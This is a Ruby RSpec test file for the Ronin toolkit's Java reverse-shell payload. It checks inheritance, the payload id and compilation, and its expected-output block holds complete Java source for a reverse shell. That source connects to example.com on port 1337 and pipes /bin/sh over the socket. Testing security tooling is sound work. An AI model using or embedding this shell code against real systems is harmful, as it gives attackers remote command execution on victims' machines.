require 'spec_helper'
require 'ronin/payloads/builtin/java/reverse_shell'

describe Ronin::Payloads::Java::ReverseShell do
  it "must inherit from Ronin::Payloads::JavaPayload" do
    expect(described_class).to be < Ronin::Payloads::JavaPayload
  end

  describe ".id" do
    subject { described_class }

    it "must equal 'java/reverse_shell'" do
      expect(subject.id).to eq('java/reverse_shell')
    end
  end

  let(:host) { 'example.com' }
  let(:port) { 1337 }

  subject do
    described_class.new(
      params: {
        host: host,
        port: port
      }
    )
  end

  describe "#build" do
    before { subject.perform_build }

    it "must generate generate a new .java file containing the host and port" do
      expect(File.read(subject.java_file)).to eq(
        <<~JAVA
          import java.io.IOException;
          import java.io.InputStream;
          import java.io.OutputStream;
          import java.net.Socket;

          public class Payload
          {
          	public static void main(String argv[]) throws Exception
          	{
          		String host = "#{host}";
          		int port = #{port};
          		String shell = "/bin/sh";

          		Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();
          		Socket socket = new Socket(host,port);

          		InputStream process_input = process.getInputStream();
          		InputStream process_error = process.getErrorStream();
          		InputStream socket_input = socket.getInputStream();
          		OutputStream process_output = process.getOutputStream();
          		OutputStream socket_output = socket.getOutputStream();

          		while (!socket.isClosed())
          		{
          			while (process_input.available()>0)
          			{
          				socket_output.write(process_input.read());
          			}

          			while (process_error.available()>0)
          			{
          				socket_output.write(process_error.read());
          			}

          			while (socket_input.available()>0)
          			{
          				process_output.write(socket_input.read());
          			}

          			socket_output.flush();
          			process_output.flush();
          			Thread.sleep(50);

          			try
          			{
          				process.exitValue();
          				break;
          			}
          			catch (Exception e) {}
          		};

          		process.destroy();
          		socket.close();
          	}
          }
        JAVA
      )
    end

    it "must compile a new Java .class file" do
      expect(File.file?(subject.class_file)).to be(true)
      expect(File.empty?(subject.class_file)).to be(false)
    end

    it "must set #payload" do
      expect(subject.payload).to eq(File.binread(subject.class_file))
    end
  end
end
